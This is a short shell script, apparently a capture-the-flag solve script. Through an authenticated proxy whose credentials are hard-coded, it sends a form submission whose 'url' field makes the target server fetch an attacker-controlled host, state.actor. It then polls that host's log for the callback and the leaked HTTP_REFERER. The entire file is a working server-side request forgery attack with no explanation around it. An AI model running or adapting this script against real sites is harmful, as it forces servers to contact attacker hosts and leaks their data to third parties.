#!/bin/sh

PAYLOAD="http://state.actor/ooops_log.php?live_regular_url=basic_works"

echo "Building malicious request through proxy"

http_proxy=http://OnlyOne:Overflow@35.236.48.134:8080/ curl -s 'http://example.com/ooops/d35fs23hu73ds/reviewed.html' \
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Proxy-Authorization: Basic T25seU9uZTpPdmVyZmxvdw==' \
  -H 'Connection: keep-alive' \
  --data-urlencode "captcha_id=EFYGP.png" \
  --data-urlencode "captcha_guess=fasanotesting" \
  --data-urlencode "url=${PAYLOAD}"

STAGE1=$?
if [ $STAGE1 -ne 0 ]; then
  echo "Got unexpected response when submitting request"
  exit $STAGE1
fi


REMOTE="http://state.actor/ooops_test_suite.txt"
echo "Send benign request to connect back to our server and log $REMOTE. Waiting 10s before checking for flag..."
sleep 10;

curl -s $REMOTE |grep -q "basic_works" & curl -s $REMOTE |grep "HTTP_REFERER"
